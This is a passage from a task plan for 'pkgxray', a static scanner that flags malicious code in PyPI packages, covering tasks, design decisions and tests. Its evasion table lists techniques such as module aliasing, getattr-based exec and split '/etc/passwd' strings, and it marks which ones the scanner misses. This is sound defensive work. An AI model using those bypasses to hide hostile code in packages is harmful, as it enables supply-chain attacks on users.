       description = "Detecta patrones sospechosos en archivos de configuración"
       
       def analyze(self, source_code: str, filename: str) -> list:
           if "pyproject.toml" in filename.lower():
               return self._analyze_pyproject(source_code, filename)
           elif "setup.cfg" in filename.lower():
               return self._analyze_setup_cfg(source_code, filename)
           return []
       
       def _analyze_pyproject(self, source_code, filename):
           if tomllib is None:
               return []
           try:
               data = tomllib.loads(source_code)
           except Exception:
               return []
           findings = []
           # Check build-system.requires for suspicious packages
           # Check project.scripts for shell commands
           # Check tool.* sections for unusual hooks
           return findings
   ```

3. Register it in `analyzers/__init__.py`.

4. In `scanner.py`, route config files to this analyzer (skip AST-based analyzers for them).

**Acceptance criteria:**
- `pyproject.toml` is no longer silently skipped
- A `pyproject.toml` with suspicious `[project.scripts]` → finding
- Tests in `tests/test_analyzers/test_config_files.py`

---

#### ✅ TASK-P4-03: Surface skipped files in ScanResult [DONE]
**Files:** `src/pkgxray/analyzers/base.py`, `src/pkgxray/scanner.py`, `src/pkgxray/reporter.py`
**Priority:** MEDIUM

**What to do:**
1. Add `skipped_files: list` field to `ScanResult`:
   ```python
   @dataclass
   class ScanResult:
       package_name: str
       version: str
       scan_date: str
       findings: list
       risk_score: int
       risk_level: str
       files_analyzed: int
       summary: dict
       skipped_files: list = field(default_factory=list)  # NEW
   ```

2. In `scanner.py`, track skipped files:
   ```python
   skipped_files = []
   for extracted_file in extracted_files:
       was_analyzed = False
       for analyzer in analyzers:
           try:
               findings = analyzer.analyze(extracted_file.content, extracted_file.filename)
               if findings is not None:
                   was_analyzed = True
                   all_findings.extend(findings)
           except Exception as e:
               logger.warning(f"{analyzer.name} failed on {extracted_file.filename}: {e}")
               continue
       # If all analyzers returned [] and the file isn't .py, it was probably unparseable
   ```

3. Display in reporter.

---

#### ✅ TASK-P4-04: Add basic logging [DONE]
**Files:** `src/pkgxray/scanner.py`, other modules as needed
**Priority:** MEDIUM

**What to do:**
```python
import logging
logger = logging.getLogger(__name__)

# In the analysis loop:
except Exception as e:
    logger.warning("Analyzer %s failed on %s: %s", analyzer.name, extracted_file.filename, e)
    continue
```

Users can enable it with `logging.basicConfig(level=logging.DEBUG)` or via a `--verbose` CLI flag.

---

### Phase 5: Infrastructure & Docs

#### TASK-P5-01: Fix version string inconsistencies
**Files:** `src/pkgxray/cli.py`, `src/pkgxray/downloader.py`
**Bugs:** BUG-07, BUG-08
**Priority:** LOW

```python
# cli.py
from pkgxray import __version__

@click.version_option(version=__version__, prog_name="pkgxray")
def main():
    ...

# downloader.py
from pkgxray import __version__

req = urllib.request.Request(url, headers={"User-Agent": f"pkgxray/{__version__}"})
```

Watch out for circular imports. If `__init__.py` imports from `scanner.py` which imports from `downloader.py`, you may need to lazy-import or read the version from `importlib.metadata` instead:
```python
from importlib.metadata import version as get_version
_version = get_version("pkgxray")
```

---

#### TASK-P5-02: Clean up dead code
**Files:** `src/pkgxray/utils.py`, `src/pkgxray/analyzers/base.py`, `src/pkgxray/extractor.py`
**Bugs:** BUG-09, BUG-10
**Priority:** LOW

- Either use `ExtractedFile.is_setup` in `scanner.py` to replace the string check, or remove the field.
- Either populate `utils.py` with shared helpers (logging setup, version reading), or delete it.

---

#### TASK-P5-03: Update all documentation after fixes
**Files:** `docs/QUANTA.md`, `docs/ADR.md`, `README.md`, `CHANGELOG.md`
**Priority:** LOW (but required for professor)

After all code changes:
1. **QUANTA.md:** Mark fixed issues as resolved, update status per component.
2. **ADR.md:** Update ADR-004 with new calibration values. Update ADR-005 with the ClassDef fix. Add ADR-008 (binary analysis research from C3).
3. **README.md:** Update the score reference table with new calibrated scores.
4. **CHANGELOG.md:** Add `## [0.3.0]` section documenting all changes.

---

#### TASK-P5-04: Enhance the demo notebook
**File:** `notebooks/pkgxray_tutorial.ipynb`
**Priority:** LOW (but required for professor)

Add a "Before vs After" section that demonstrates:
1. A clean package that previously scored HIGH now correctly scores LOW/MODERATE.
2. A malicious code snippet that correctly scores CRITICAL.
3. The HTML report rendered inline.

---

#### ✅ TASK-P5-05: Write `test_scorer.py` and `test_reporter.py` [DONE]
**Files:** New `tests/test_scorer.py`, `tests/test_reporter.py`
**Priority:** LOW

Currently missing entirely. At minimum:
- `test_scorer.py`: empty findings → (0, "LOW"); single CRITICAL → correct score; per-analyzer capping works; combo bonuses work (after P3-02).
- `test_reporter.py`: JSON output is valid JSON; HTML output doesn't contain unescaped user input (regression test for BUG-01).

---

## 7. Design Decisions (ADRs) to Maintain

When implementing changes, respect these existing ADRs:

| ADR | Decision | Implication for Tasks |
|-----|----------|----------------------|
| ADR-001 | Static AST analysis, no code execution | Never `import` or `exec` the analyzed package |
| ADR-002 | urllib-only HTTP client | Don't add `requests` as a dependency |
| ADR-003 | Fail-open per analyzer | Keep `try/except` around each analyzer call, but add logging |
| ADR-004 | Two-level score capping | Modify caps/thresholds in P3-02, then UPDATE this ADR |
| ADR-005 | Module-level severity escalation | Fix the ClassDef gap in P2-04, then UPDATE this ADR |
| ADR-006 | Docker as canonical test env | All tests must pass in `docker compose run test` |
| ADR-007 | Receiver-name-based FP mitigation | Improve it in P2-01 and P2-02, then UPDATE this ADR |

---

## 8. Assumptions the Library Relies On

Keep these in mind — they define the boundaries of what pkgxray can and cannot detect:

| # | Assumption | Impact if Violated |
|---|------------|-------------------|
| 1 | Package is on PyPI with a public JSON API endpoint | `PackageNotFoundError`; private registries not supported |
| 2 | Archive is `.tar.gz`, `.whl`, or `.zip` | `ValueError` for unsupported formats |
| 3 | Malicious code is written in Python | Compiled extensions (`.so`, `.pyd`) are invisible |
| 4 | Module names are not aliased | `import subprocess as sp; sp.run(...)` bypasses detection |
| 5 | Function names are not assigned to variables | `e = exec; e("payload")` bypasses detection |
| 6 | Python source is syntactically valid for the scanner's Python version | Files that fail `ast.parse()` are skipped |
| 7 | Sensitive paths appear as string literals | `"/etc/" + "passwd"` is not detected |
| 8 | Network is available during scan | No offline/cache mode |
| 9 | PyPI JSON API format is stable | Format changes would break `find_best_distribution()` |
| 10 | Files are UTF-8 encoded | Non-UTF-8 bytes are silently dropped |

---

## 9. Known Evasion Techniques (Reference)

These are techniques that attackers use to bypass static analysis. Our current detection status:

| # | Technique | Detected? | Which Analyzer | Notes |
|---|-----------|-----------|---------------|-------|
| 1 | `eval("payload")` | ✅ Yes | code_exec | |
| 2 | `exec(base64.b64decode(...))` | ✅ Yes | obfuscation | |
| 3 | `subprocess.Popen(...)` at module level | ✅ Yes | subprocess | Escalated to CRITICAL |
| 4 | `setup.py` install hooks | ✅ Yes | setup_scripts | |
| 5 | `import subprocess as sp; sp.run(...)` | ❌ No | — | Module aliasing bypass. Affects ALL analyzers. OUT OF SCOPE for v0.3 but document in ADR. |
| 6 | `from subprocess import run; run(...)` | ❌ No | — | Direct import bypass. OUT OF SCOPE for v0.3. |
| 7 | `getattr(builtins, "exec")(payload)` | ❌ No | — | Indirect access. OUT OF SCOPE for v0.3. |
| 8 | `payload = b64decode(...); exec(payload)` | ❌ No | — | Intermediate variable. OUT OF SCOPE for v0.3. |
| 9 | `self.session.get(url)` | ✅ After P2-02 | network | Fixed by chained attribute resolution |
| 10 | `list.remove(x)` false positive | ✅ After P2-01 | filesystem | Fixed by receiver filtering |
| 11 | Compiled `.so`/`.pyd` extensions | ❌ No | — | Requires binary analysis. Research in C3. |
| 12 | `"/etc/" + "passwd"` string concatenation | ❌ No | — | Requires data flow analysis. OUT OF SCOPE. |

---

## 10. Test Strategy

### Running tests

```bash
# Unit tests only (fast, no network)
pytest tests/ -v -m "not slow and not integration"

# Integration tests (with fixtures, no network)
pytest tests/ -v -m "integration"

# All tests including slow ones (hits PyPI network)
pytest tests/ -v

# With coverage
pytest tests/ --cov=pkgxray --cov-report=html -m "not slow"

# In Docker (canonical)
docker compose run test
```

### Test files to create or update

| File | Action | For Tasks |
|------|--------|-----------|
| `tests/fixtures/__init__.py` | ✅ DONE | P3-01 |
| `tests/test_integration.py` | ✅ DONE | P3-03 |
| `tests/test_scorer.py` | ✅ DONE | P5-05 |
| `tests/test_reporter.py` | ✅ DONE | P5-05 |
| `tests/test_analyzers/test_config_files.py` | CREATE | P4-02 |
| `tests/test_analyzers/test_filesystem.py` | ✅ DONE | P2-01, P2-05 |
| `tests/test_analyzers/test_network.py` | ✅ DONE | P2-02 |
| `tests/test_analyzers/test_dynamic_imports.py` | ✅ DONE | P2-03 |
| `tests/test_analyzers/test_code_exec.py` | ✅ DONE | P2-04 (ClassDef test) |
| `tests/test_analyzers/test_subprocess.py` | ✅ DONE | P2-04 (ClassDef test) |
| `tests/test_extractor.py` | ✅ DONE | P1-02 |

---

## 11. Definition of Done

A task is done when:

1. The code change works correctly (manual verification).
2. At least one new test covers the specific case that was fixed.
3. All existing tests still pass: `pytest tests/ -v -m "not slow"`.
4. If it changes a design decision, `docs/ADR.md` is updated.
5. If it fixes a known issue, `docs/QUANTA.md` is updated.
6. `CHANGELOG.md` has an entry for the change.

---

## Implementation Order (Recommended)

```
Phase 1 (Security — do first, ~30 min)
├── ✅ P1-01: Fix XSS in reporter [DONE]
└── ✅ P1-02: Fix path traversal in extractor [DONE]

Phase 2 (Correctness — do second, ~2-3 hours)
├── ✅ P2-01: Fix list.remove() false positive [DONE]
├── ✅ P2-02: Fix chained attribute detection in network [DONE]
├── ✅ P2-03: Fix dynamic_imports receiver + severity [DONE]
├── ✅ P2-04: Fix is_module_level ClassDef bug [DONE]
├── ✅ P2-05: Add is_module_level to 3 analyzers [DONE]
└── ✅ P2-06: Expand sensitive paths and env keywords [DONE]

Phase 3 (Scorer — do third, ~1-2 hours)
├── ✅ P3-01: Create synthetic fixtures [DONE]
├── ✅ P3-02: Recalibrate scorer (depends on Phase 2 + P3-01) [DONE]
└── ✅ P3-03: Integration tests (depends on P3-01 + P3-02) [DONE]

Phase 4 (New features — do fourth, ~2 hours)
├── ✅ P4-01: --fail-above CLI option [DONE]
├── ✅ P4-02: TOML parsing for pyproject.toml [DONE]
├── ✅ P4-03: Surface skipped files in ScanResult [DONE]
└── ✅ P4-04: Add basic logging [DONE]

Phase 5 (Cleanup & docs — do last, ~1 hour)
├── P5-01: Fix version strings
├── P5-02: Clean up dead code
├── P5-03: Update all docs (QUANTA, ADR, README, CHANGELOG)
├── P5-04: Enhance demo notebook
└── ✅ P5-05: Write test_scorer.py and test_reporter.py [DONE]
```

Total estimated effort: **7-9 hours** of focused work.

---

**End of instructions. Start with Phase 1.**
